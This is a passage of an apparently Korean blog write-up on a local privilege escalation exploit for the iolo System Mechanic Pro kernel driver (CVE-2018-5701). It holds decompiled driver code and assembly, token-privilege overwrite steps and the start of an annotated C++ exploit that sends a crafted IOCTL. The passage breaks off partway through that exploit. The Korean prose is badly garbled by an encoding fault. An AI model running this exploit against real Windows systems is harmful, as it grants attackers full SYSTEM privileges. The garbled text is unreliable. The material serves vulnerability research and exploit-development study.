contaning 3 64-bits fields</span>  field2_64 = *((_QWORD *)userBuffer + <span class="hljs-number">1</span>);  field3_64_ptr = *((_QWORD *)userBuffer + <span class="hljs-number">2</span>);  field3_32_ptr = field3_64_ptr;  field2_32 = field2_64;  field1_32 = field1_64;LABEL_6:  <span class="hljs-keyword">if</span> ( !qword_FFFFF80068928B28 )    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000001</span>i64;                       <span class="hljs-comment">// STATUS_UNSUCCESSFUL</span>  <span class="hljs-keyword">if</span> ( field1_32 &gt;= *(_DWORD *)qword_FFFFF80068928B28 )<span class="hljs-comment">// MUST BE &lt; 9</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC000000D</span>i64;                       <span class="hljs-comment">// STATUS_INVALID_PARAMETER</span>  field2_64 = field2_32;  field1_64 = *(_QWORD *)(qword_FFFFF80068928B28 + <span class="hljs-number">16</span>i64 * field1_32 + <span class="hljs-number">8</span>);<span class="hljs-comment">// jmp table (0-8)</span>  LODWORD(field3_64_ptr) = *(_DWORD *)(qword_FFFFF80068928B28 + <span class="hljs-number">16</span>i64 * field1_32 + <span class="hljs-number">16</span>);<span class="hljs-comment">// set lower 32 bits of fields3_64</span>  v11 = &amp;v12;  jmptable(&amp;field1_64);                         <span class="hljs-comment">// addr jmp table based</span>  <span class="hljs-keyword">if</span> ( BoolIs32BitProcess )    *(_DWORD *)field3_32_ptr = v12;  <span class="hljs-keyword">else</span>    *(_QWORD *)field3_32_ptr = v12;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;                                  <span class="hljs-comment">// SUCCESS</span>&#125;</code></pre><h2 id="Analyzing-SUB-16C40"><a href="#Analyzing-SUB-16C40" class="headerlink" title="Analyzing SUB_16C40"></a>Analyzing SUB_16C40</h2><p>ì´ í•¨ìˆ˜ëŠ” ë””ì»´íŒŒì¼ ì½”ë“œê°€ ê·¸ë‹¤ì§€ ë„ì›€ì´ ë˜ì§€ ì•Šì•˜ê³  í•´ì„ì— ì˜¤í•´ì˜ ì†Œì§€ê°€ ìˆì–´ ê³¨ì¹«ê±°ë¦¬ì˜€ë‹¤. </p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_16C40</span><span class="hljs-params">(__int64 a1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// rcx</span>  __int64 v3; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">void</span> *v4; <span class="hljs-comment">// rsp</span>  <span class="hljs-keyword">char</span> vars20; <span class="hljs-comment">// [rsp+20h] [rbp+20h] BYREF</span>  v2 = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(a1 + <span class="hljs-number">16</span>);  v3 = v2;  <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0x20</span> )  &#123;    v2 = <span class="hljs-number">40</span>i64;    v3 = <span class="hljs-number">32</span>i64;  &#125;  v4 = alloca(v2);  <span class="hljs-keyword">if</span> ( v3 - <span class="hljs-number">32</span> &gt; <span class="hljs-number">0</span> )    qmemcpy(&amp;vars20, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">32</span>i64), v3 - <span class="hljs-number">32</span>);  **(_QWORD **)(a1 + <span class="hljs-number">24</span>) = (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD, _QWORD))a1)(                             **(_QWORD **)(a1 + <span class="hljs-number">8</span>),                             *(_QWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">8</span>i64),                             *(_QWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">16</span>i64),                             *(_QWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">24</span>i64));&#125;</code></pre><p>ìœ„ì˜ ì½”ë“œì—ì„œëŠ” ìœ ì €ê°€ ì œì–´í•  ìˆ˜ ìˆëŠ” ìœ„ì¹˜ì— <code>userBuffer</code>ì˜ ê°’ì„ ë³µì‚¬í•  ë•Œ ê°€ëŠ¥í•œ ì„ì˜ ì“°ê¸° ì·¨ì•½ì ì´ íŠ¸ë¦¬ê±° ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ <code>qmemcpy</code>ê°€ ì í•©í•œ í•¨ìˆ˜ë¼ê³  ìƒê°í–ˆìœ¼ë©° <code>memcpy(* destination, * source, size_t);</code>ë¥¼ ì™„ì „íˆ ì œì–´í•  ìˆ˜ ìˆì„  ê²ƒìœ¼ë¡œ ì¶”ì¸¡í–ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë•Œë¡œëŠ” ë‚˜ë¬´ì— ì§‘ì¤‘í•´ ìˆ²ì„ ë³´ì§€ ëª»í•˜ê²Œ ëœë‹¤. ë§ì€ ì‹œê°„ì„ ë³´ë‚¸ í›„ Access violationì„ ì¼ìœ¼í‚¤ëŠ” ëª…ë ¹ì´ memcpy ìì²´ê°€ ì•„ë‹Œ memcpy ì´í›„ì— ë°œìƒí•˜ëŠ” ë‹¤ë¥¸ ëª…ë ¹ê³¼ ê´€ë ¨ì´ ìˆë‹¤ëŠ” ê²ƒì„ ë°œê²¬í–ˆë‹¤. ì´ì „ ì„¹ì…˜ì—ì„œ ìƒê°í•´ ë³´ë©´ <code>amp+6c8d</code>ì—ì„œ ì•¡ì„¸ìŠ¤ ìœ„ë°˜ì´ ë°œìƒí–ˆë‹¤. ë””ì»´íŒŒì¼ ëœ ì˜ì‚¬ ì½”ë“œê°€ ì•„ë‹Œ ì›ì‹œ ì–´ì…ˆë¸”ë¦¬ë¥¼ ì‚´í´ë³´ë©´ ë” ì‰¬ì›Œì§„ë‹¤.</p><pre><code class="hljs cpp">.text:<span class="hljs-number">0000000000016</span>C6A                 sub     rsp, rcx.text:<span class="hljs-number">0000000000016</span>C6D                 <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0F</span>FFFFFFFFFFFFFF0h.text:<span class="hljs-number">0000000000016</span>C71                 lea     rcx, [rax<span class="hljs-number">-20</span>h].text:<span class="hljs-number">0000000000016</span>C75                 test    rcx, rcx.text:<span class="hljs-number">0000000000016</span>C78                 jle     <span class="hljs-keyword">short</span> loc_16C89.text:<span class="hljs-number">0000000000016</span>C7A                 mov     rsi, [rbx+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C7E                 lea     rsi, [rsi+<span class="hljs-number">20</span>h].text:<span class="hljs-number">0000000000016</span>C82                 lea     rdi, [rsp+var_s20].text:<span class="hljs-number">0000000000016</span>C87                 rep movsb.text:<span class="hljs-number">0000000000016</span>C89.text:<span class="hljs-number">0000000000016</span>C89 loc_16C89:                              ; CODE XREF: sub_16C40+<span class="hljs-number">38</span>â†‘j.text:<span class="hljs-number">0000000000016</span>C89                 mov     rsi, [rbx+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C8D                 mov     rcx, [rsi].text:<span class="hljs-number">0000000000016</span>C90                 mov     rdx, [rsi+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C94                 mov     r8, [rsi+<span class="hljs-number">10</span>h].text:<span class="hljs-number">0000000000016</span>C98                 mov     r9, [rsi+<span class="hljs-number">18</span>h].text:<span class="hljs-number">0000000000016</span>C9C                 call    qword ptr [rbx]</code></pre><p><code>16C8D</code>, <code>mov rcx, [rsi]</code>ì—ì„œ ì•¡ì„¸ìŠ¤ ìœ„ë°˜ì´ ë°œìƒí•˜ì§€ë§Œ í•´ë‹¹ ëª…ë ¹ ë°”ë¡œ ì•ì„ ë³´ë©´ <code>memcpy</code>ì— ëŒ€í•œ í˜¸ì¶œì€ ì°¾ì„ ìˆ˜ ì—†ì—ˆë‹¤. ì´ë¥¼ ë°íˆê¸° ìœ„í•´ ì¢€ ë” íŒŒí—¤ì³¤ê³  Reverse Engineering Discord Serverì˜ ë©¤ë²„ê°€ IDAê°€ ë””ì»´íŒŒì¼ì—ì„œ  <code>qmempy</code>ë¡œ ë‚˜íƒ€ë‚´ëŠ” ì´ìœ ëŠ” <code>rsi</code>ì—ì„œ <code>rdi</code>ë¡œ <code>rcx</code> bytes ë§Œí¼ ë³µì‚¬í•  ë•Œ ì‚¬ìš©í•˜ëŠ” <code>rep movsb</code> ì˜ <code>movsb</code>ë•Œë¬¸ì„ì„ ì„¤ëª…í–ˆë‹¤. ì–´ì¨Œë“  <code>mov rcx, [rsi]</code> ëª…ë ¹ì–´ë¥¼ ì‚´í´ë³´ê³  <code>rsi</code> í• ë‹¹ê³¼ ì‚¬ìš©ì„ ì—­ì¶”ì í•˜ë©´ ê·¸ ê°’ì´ <code>rcx</code>ë ˆì§€ìŠ¤í„°ì—ì„œ ë‚˜ì˜¨ë‹¤ëŠ” ê²ƒì„ í™•ì¸í–ˆë‹¤.</p><pre><code class="hljs cpp">.text:<span class="hljs-number">0000000000016</span>C47                 mov     rbx, rcx....text:<span class="hljs-number">0000000000016</span>C89                 mov     rsi, [rbx+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C8D                 mov     rcx, [rsi]</code></pre><p>RCX ë ˆì§€ìŠ¤í„°(x86_64 fastcall convention)ëŠ” í•¨ìˆ˜ ì¸ìˆ˜(<code>RCX</code>, <code>RDX</code>, <code>R8</code>, <code>R9</code>, ë‚˜ë¨¸ì§€ ì¸ìˆ˜ëŠ” ìŠ¤íƒì— ì „ë‹¬ë¨)ë¥¼ ì „ë‹¬í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤. <code>SUB_16C40</code>ì€ <code>SUB_166D0</code>ì—ì„œ í•˜ë‚˜ì˜ ì¸ìˆ˜ <code>SUB_166D0ì˜ v8</code> ë§Œ ë°›ìœ¼ë¯€ë¡œ RCXì—ëŠ” <code>field1</code>ì—ì„œ ê°€ì ¸ì˜¨ í•´ë‹¹ ì¸ìˆ˜ì˜ ì£¼ì†Œê°€ í¬í•¨ëœë‹¤. ì´ì œ ì „ì²´ ìœ ì € ë²„í¼ë¥¼ ioctlbf í¼ì €ê°€ 0ìœ¼ë¡œ ì„¤ì •í•´ ì•¡ì„¸ìŠ¤ ìœ„ë°˜ì´ ë°œìƒí–ˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤. ì´ ê²½ìš° ì²« ë²ˆì§¸ ìœ ì € ë²„í¼ëŠ” <code>v8</code>ì˜ ê°’ <code>v8 = *(_QWORD*)(9+16*field1_user_buffer + 8);</code>ì„ ê³„ì‚°í•˜ëŠ” ë° ì‚¬ìš©ë˜ë©° <code>mov rcx, [rsi]</code> ëª…ë ¹ì´ ì‹¤í–‰ë  ë•Œ <code>rsi</code>ëŠ” ì—­ì°¸ì¡° í•  ìœ íš¨í•˜ì§€ ì•Šì€ ë©”ëª¨ë¦¬ ìœ„ì¹˜ì— ëŒ€í•œ í¬ì¸í„°ê°€ ëœë‹¤. ì–´ì…ˆë¸”ë¦¬ë¥¼ ë‹¤ì‹œ ì‚´í´ë³´ë©´ <code>rcx</code>, <code>rdx</code>, <code>r8</code> ë° <code>r9</code> ë ˆì§€ìŠ¤í„°ë¥¼ ì±„ìš°ëŠ” ë‹¤ë¥¸ fastcall í˜¸ì¶œì„ í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">.text:<span class="hljs-number">0000000000016</span>C8D                 mov     rcx, [rsi].text:<span class="hljs-number">0000000000016</span>C90                 mov     rdx, [rsi+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C94                 mov     r8, [rsi+<span class="hljs-number">10</span>h].text:<span class="hljs-number">0000000000016</span>C98                 mov     r9, [rsi+<span class="hljs-number">18</span>h].text:<span class="hljs-number">0000000000016</span>C9C                 call    qword ptr [rbx]</code></pre><p>ì—¬ê¸°ì„œ í¥ë¯¸ë¡œìš´ ì ì´ ë‚˜íƒ€ë‚˜ëŠ”ë°, <code>16C47 mov rbx, rcx</code> ì´í›„ <code>rbx</code>ê°€ ìœ íš¨í•œ ë©”ëª¨ë¦¬ë©´ call opcodeì— ì˜í•´ í˜¸ì¶œë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ë•Œ  <code>RBX</code>ì˜ ê°’ì€ ëŸ°íƒ€ì„ì—ì„œ ê³„ì‚°ë˜ê¸° ë•Œë¬¸ì— IDAì˜ ë””ì»´íŒŒì¼ ê¸°ëŠ¥ì€ ìœ„ ëª…ë ¹ì–´ì˜ ê²°ê³¼ë¥¼ ë”°ë¼ê°ˆ ìˆ˜ ì—†ë‹¤. <code>v8</code>ì€ <code>sub_166D0</code>ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´ 0~8ê¹Œì§€ì˜ ê°’ì„ ê°€ì§€ë©° í˜¸ì¶œí•  í•¨ìˆ˜ indexë¡œ í™œìš©ë˜ë©° <code>v8</code>ì˜ ê°’ì— ë”°ë¼ ê°ê° í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ë“¤ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</p><ol><li><code>sub_2CBA0</code></li><li><code>sub_2CB20</code></li><li><code>sub_2C960</code></li><li><code>sub_2C850</code></li><li><code>sub_2C7F0</code></li><li><code>sub_18D20</code></li><li><code>sub_2C510</code></li><li><code>sub_2C360</code></li><li><strong><code>sub_2C460</code> &lt;&lt;</strong></li></ol><h2 id="Analyzing-sub-2C460"><a href="#Analyzing-sub-2C460" class="headerlink" title="Analyzing sub_2C460"></a>Analyzing sub_2C460</h2><p>ìœ„ í•¨ìˆ˜ë“¤ ì¤‘ ì œí•œëœ arbitrary writeê°€ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì ì—ì„œ ìµìŠ¤í”Œë¡œì‡ì— ì‚¬ìš©í•  í•¨ìˆ˜ë¡œëŠ” <code>sub_2C460</code>ê°€ ê°€ì¥ ìœ ë ¥í–ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">jmp8</span><span class="hljs-params">(_DWORD *a1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-38h]</span>  v2 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( !a1 )  <span class="hljs-comment">// must be === 0</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFE</span>;  sub_FFFFF800689067D0((__int64)a1, <span class="hljs-number">0x2C</span>ui64);  <span class="hljs-keyword">if</span> ( *a1 != <span class="hljs-number">44</span>i64 )    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;  qmemcpy(a1, &amp;unk_FFFFF80068926BA8, <span class="hljs-number">0x2C</span>ui64);  <span class="hljs-keyword">return</span> v2;&#125;</code></pre><p><code>sub_2C460</code> ì€ ê¶Œí•œìƒìŠ¹ ìµìŠ¤í”Œë¡œì‡ì— ê±°ì˜ ì™„ë²½í•œ <code>0xFFFFFFFE</code>ë¥¼ ë°˜í™˜í•œë‹¤.</p><h1 id="Constraint-amp-Analysis-Recap"><a href="#Constraint-amp-Analysis-Recap" class="headerlink" title="Constraint&amp;Analysis Recap"></a>Constraint&amp;Analysis Recap</h1><p>ì§€ê¸ˆê¹Œì§€ ë¶„ì„í•œ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</p><ul><li>ì·¨ì•½í•œ ë“œë¼ì´ë²„ì— ë³´ë‚¼ ìˆ˜ ìˆëŠ” ì œì–´ ê°€ëŠ¥í•œ ìœ ì € ë²„í¼ê°€ 3ê°œì˜ 8bytes í•„ë“œë¡œ êµ¬ì„±ëœ 24bytes í¬ê¸°ì˜ êµ¬ì¡°ì²´ì´ë‹¤.</li><li>ì²« ë²ˆì§¸ í•„ë“œëŠ” í•­ìƒ 9ë³´ë‹¤ ì‘ì€ ì •ìˆ˜ì´ë©° í•´ë‹¹ ê°’ì— ë”°ë¼ í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ ì¤‘ <code>sub_2C460</code>ì— ë„ë‹¬í•˜ê¸° ìœ„í•´ì„œëŠ” 8ì´ì–´ì•¼ í•œë‹¤. (<code>sub_2C460</code> ì°¸ê³ )</li><li>ë‘ ë²ˆì§¸ í•„ë“œëŠ” ì—­ì°¸ì¡° ë  ë•Œ 0ì„ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì— ëŒ€í•œ ìœ íš¨í•œ í¬ì¸í„°ì—¬ì•¼ í•œë‹¤. (<code>sub_2C460</code> ì°¸ê³ )</li></ul><p>ì„¸ ë²ˆì§¸ í•„ë“œì—ëŠ” <code>sub_2C460</code>ì˜ ë°˜í™˜ê°’(<code>0xFFFFFFFE</code>)ì— ì˜í•´ ê¸°ë¡ë  ì£¼ì†Œê°€ í¬í•¨ë˜ì–´ì•¼ í•œë‹¤.</p><h1 id="Abusing-Token-Privileges-for-LPE"><a href="#Abusing-Token-Privileges-for-LPE" class="headerlink" title="Abusing Token Privileges for LPE"></a>Abusing Token Privileges for LPE</h1><p>ì„±ê³µì ì¸ ê¶Œí•œ ìƒìŠ¹ì„ ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ê¸°ìˆ ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.</p><ol><li>SYSTEMì˜ í† í°ì„ íƒˆì·¨í•´ í”„ë¡œì„¸ìŠ¤ë¥¼ ëŒ€ì²´í•˜ëŠ” ë° ì‚¬ìš©í•œë‹¤.</li><li>í”„ë¡œì„¸ìŠ¤ì˜ í† í° ê°’ì„ ìœ ì§€í•˜ëŠ” ì»¤ë„ êµ¬ì¡°ì²´ë¥¼ overwriteí•œë‹¤.</li></ol><p>arbitrary writeê°€ ê°€ëŠ¥í•˜ë¯€ë¡œ ë‘ ë²ˆì§¸ ê²½ìš°ë¥¼ ê³ ë ¤í•´ë³¸ë‹¤. WindowsëŠ” í† í° ê°ì²´ë¥¼ ì‚¬ìš©í•´ íŠ¹ì • ìŠ¤ë ˆë“œ/í”„ë¡œì„¸ìŠ¤ì˜ ë³´ì•ˆ ì»¨í…ìŠ¤íŠ¸ë¥¼ ê´€ë¦¬í•œë‹¤.(í† í° ê°ì²´ëŠ” <code>nt!_TOKEN</code> êµ¬ì¡°ì²´ë¡œ í‘œí˜„ë¨) ì‹œìŠ¤í…œì˜ ê° í”„ë¡œì„¸ìŠ¤ëŠ” object access negotiations í˜¹ì€ ê¶Œí•œ ìˆëŠ” ì‹œìŠ¤í…œ ì‘ì—… ì¤‘ì— ì‚¬ìš©ë˜ëŠ” <code>EPROCESS</code> êµ¬ì¡°ì²´ì— í† í° ê°ì²´ ì°¸ì¡°ê°€ ìˆë‹¤. ì´ì¤‘ <code>_TOKEN*+ 0x40*</code>ì˜ <code>_SEP_TOKEN_PRIVILEGES</code>ê°€ ê¶Œí•œ ìƒìŠ¹ê³¼ ê´€ë ¨ëœ í•„ë“œì´ë‹¤.</p><pre><code class="hljs c">kd&gt; dt nt!_SEP_TOKEN_PRIVILEGES c5d39c30+<span class="hljs-number">40</span>   +<span class="hljs-number">0x000</span> Present          : <span class="hljs-number">0x00000006</span>`<span class="hljs-number">02880000</span>   +<span class="hljs-number">0x008</span> Enabled          : <span class="hljs-number">0x800000</span>  +<span class="hljs-number">0x010</span> EnabledByDefault : <span class="hljs-number">0x800000</span></code></pre><p><code>Present</code> : í† í°ì— ëŒ€í•œ í˜„ì¬ ê¶Œí•œ</p><p><code>Enable</code> : í† í°ì— ëŒ€í•´ í™œì„±í™”ëœ ëª¨ë“  ê¶Œí•œ. <code>SeSinglePrivilegeCheck</code>ë¥¼ ì „ë‹¬í•˜ë ¤ë©´ ì´ ë¹„íŠ¸ ë§ˆìŠ¤í¬ì—ì„œ ê¶Œí•œì„ í™œì„±í™”í•´ì•¼ í•œë‹¤.</p><p><code>EnableByDefault</code> : í† í°ì˜ ì´ˆê¸° ìƒíƒœ</p><p><code>Present</code> ë° <code>Enabled</code> í•­ëª©ì„ <code>0xFFFFFFFF</code> ê°’ìœ¼ë¡œ overwrite í•˜ë©´ ë¹„íŠ¸ ë§ˆìŠ¤í¬ì˜ ëª¨ë“  ë¹„íŠ¸ì™€ ê¶Œí•œì„ í™œì„±í™”í•  ìˆ˜ ìˆë‹¤. ë”°ë¼ì„œ <code>0xFFFFFFFE</code> ë¥¼ ì“°ëŠ” ê²ƒì´ ìš°ë¦¬ì—ê²Œ í•„ìš”í•œ ì „ë¶€ì´ë‹¤.</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>exploitì€ ë‹¤ìŒ ë‹¨ê³„ë¥¼ ìˆ˜í–‰í•œë‹¤.</p><ol><li>í˜„ì¬ í”„ë¡œì„¸ìŠ¤ì˜ í† í°ì„ ì—°ë‹¤. - ë‚˜ì¤‘ì— ì»¤ë„ ì£¼ì†Œë¥¼ ì°¾ì„ ë•Œ ì‚¬ìš©ëœë‹¤.</li><li><code>NtQuerySystemInformation</code> APIë¡œ í•¸ë“¤ì´ ìˆëŠ” ëª¨ë“  ê°ì²´ì˜ ì»¤ë„ ì£¼ì†Œë¥¼ leak í•œë‹¤.</li><li>í˜„ì¬ í”„ë¡œì„¸ìŠ¤ì—ì„œ í† í° í•¸ë“¤ì„ ì°¾ê³  <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization#Microsoft_Windows">kASLR</a>ì„ ìš°íšŒí•´ ì»¤ë„ ì£¼ì†Œë¥¼ ê°€ì ¸ì˜¨ë‹¤.</li><li><code>0xFFFFFFFE</code>ì„ ë°˜í™˜í•˜ëŠ” ì·¨ì•½í•œ ë“œë¼ì´ë²„ì— ëŒ€í•œ IOCTL ìš”ì²­ ì½”ë“œë¥¼ ì‘ì„±í•˜ê³  <code>Present</code> í•„ë“œë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ì¶œë ¥ ë²„í¼ ì£¼ì†Œë¥¼ ì„¤ì •í•œë‹¤.</li><li>ê°™ì€ ë°©ë²•ìœ¼ë¡œ <code>Enabled</code> ë° <code>EnabledByDefault</code> í•„ë“œë¥¼ <code>0xFFFFFFFE</code>ë¡œ overwrite í•œë‹¤. </li><li>ìœ„ì—ì„œ ë¶€ì—¬í•œ í† í° ê¶Œí•œì„ ìƒì†í•˜ëŠ” ìì‹ í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒì„±í•œë‹¤.</li></ol><p>í•­ìƒ ê·¸ë¬ë“¯ì´ ì£¼ì„ì´ ë‹¬ë¦° C++ exploit codeëŠ” ì—¬ê¸° ë˜ëŠ” <a href="https://github.com/VoidSec/Exploit-Development/blob/master/windows/x64/kernel/iolo_System_Mechanic_Pro_v.15.5.0.61/iolo_System_Mechanic_Pro_v.15.5.0.61.cpp">Github</a> í˜ì´ì§€ì—ì„œ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><span class="hljs-comment">Exploit title:      iolo System Mechanic Pro v. &lt;= 15.5.0.61 - Arbitrary Write Local Privilege Escalation (LPE)</span><span class="hljs-comment">Exploit Authors:    Federico Lagrasta aka last - https://blog.notso.pro/</span><span class="hljs-comment">                    Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com</span><span class="hljs-comment">CVE:                CVE-2018-5701</span><span class="hljs-comment">Date:               28/03/2021</span><span class="hljs-comment">Vendor Homepage:    https://www.iolo.com/</span><span class="hljs-comment">Download:           https://www.iolo.com/products/system-mechanic-ultimate-defense/</span><span class="hljs-comment">                    https://mega.nz/file/xJgz0QYA#zy0ynELGQG8L_VAFKQeTOK3b6hp4dka7QWKWal9Lo6E</span><span class="hljs-comment">Version:            v.15.5.0.61</span><span class="hljs-comment">Tested on:          Windows 10 Pro x64 v.1903 Build 18362.30</span><span class="hljs-comment">Category:           local exploit</span><span class="hljs-comment">Platform:           windows</span><span class="hljs-comment">*/</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOCTL_CODE 0x226003 <span class="hljs-comment">// IOCTL_CODE value, used to reach the vulnerable function (taken from IDA)</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SystemHandleInformation 0x10</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SystemHandleInformationSize 1024 * 1024 * 2</span><span class="hljs-comment">// define the buffer structure which will be sent to the vulnerable driver</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Exploit</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">uint32_t</span> Field1_1;  <span class="hljs-comment">// must be 0x8 as this index will be used to calculate the address in a jump table and trigger the vulnerable function</span>    <span class="hljs-keyword">uint32_t</span> Field1_2;  <span class="hljs-comment">// &quot;padding&quot; can be anything</span>    <span class="hljs-keyword">int</span> *Field2;        <span class="hljs-comment">// must be a pointer that, once dereferenced, cotains 0</span>    <span class="hljs-keyword">void</span> *Field3;       <span class="hljs-comment">// points to the adrress that will be overwritten by 0xfffffffe - Arbitrary Write</span>&#125;;<span class="hljs-comment">// define a pointer to the native function &#x27;NtQuerySystemInformation&#x27;</span><span class="hljs-keyword">using</span> pNtQuerySystemInformation = NTSTATUS(WINAPI *)(    ULONG SystemInformationClass,    PVOID SystemInformation,    ULONG SystemInformationLength,    PULONG ReturnLength);<span class="hljs-comment">// define the SYSTEM_HANDLE_TABLE_ENTRY_INFO structure</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_HANDLE_TABLE_ENTRY_INFO</span></span><span class="hljs-class">&#123;</span>    USHORT UniqueProcessId;    USHORT CreatorBackTraceIndex;    UCHAR ObjectTypeIndex;    UCHAR HandleAttributes;    USHORT HandleValue;    PVOID Object;    ULONG GrantedAccess;&#125; SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;<span class="hljs-comment">// define the SYSTEM_HANDLE_INFORMATION structure</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_HANDLE_INFORMATION</span></span><span class="hljs-class">&#123;</span>    ULONG NumberOfHandles;    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span class="hljs-number">1</span>];&#125; SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open a handle to the device exposed by the driver - symlink is \\.\amp</span>    HANDLE device = ::CreateFileW(        <span class="hljs-string">L&quot;\\\\.\\amp&quot;</span>,        GENERIC_WRITE | GENERIC_READ,        <span class="hljs-literal">NULL</span>,        <span class="hljs-literal">nullptr</span>,        OPEN_EXISTING,        <span class="hljs-literal">NULL</span>,        <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (device == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t open handle to the System Mechanic driver. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Opened a handle to the System Mechanic driver!\n&quot;</span>;    <span class="hljs-comment">// resolve the address of NtQuerySystemInformation and assign it to a function pointer</span>    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)::GetProcAddress(::LoadLibraryW(<span class="hljs-string">L&quot;ntdll&quot;</span>), <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);    <span class="hljs-keyword">if</span> (!NtQuerySystemInformation)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t resolve NtQuerySystemInformation API. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Resolved NtQuerySystemInformation!\n&quot;</span>;    <span class="hljs-comment">// open the current process token - it will be used to retrieve its kernelspace address later</span>    HANDLE currentProcess = ::GetCurrentProcess();    HANDLE currentToken = <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">bool</span> success = ::OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &amp;currentToken);    <span 